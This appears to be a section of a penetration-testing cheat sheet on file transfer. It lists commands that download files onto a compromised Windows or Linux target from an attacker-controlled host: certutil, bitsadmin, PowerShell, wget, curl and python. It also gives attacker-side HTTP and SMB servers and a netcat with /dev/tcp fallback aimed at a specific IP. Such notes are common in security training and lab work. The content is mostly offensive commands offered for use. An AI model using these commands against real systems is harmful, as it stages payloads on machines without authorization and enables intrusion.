# 18. File Transfer Methods

## Windows — download to target

`certutil -urlcache -split -f http://<ip>/file.exe file.exe
powershell IWR http://<ip>/file.exe -OutFile file.exe
bitsadmin /transfer j http://<ip>/f.exe C:\Temp\f.exe
copy \\<ip>\share\file.exe .`

## Linux — download to target

`wget http://<ip>/file -O /tmp/file
curl http://<ip>/file -o /tmp/file
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<ip>/f','/tmp/f')"`

## Quick servers (attacker)

`python3 -m http.server 80
python3 -m uploadserver 80
impacket-smbserver share $(pwd) -smb2support`

wget curl and python not found 

nc -lnp 8000 < nmap

cat < /dev/tcp/10.10.15.206/8000 > nmap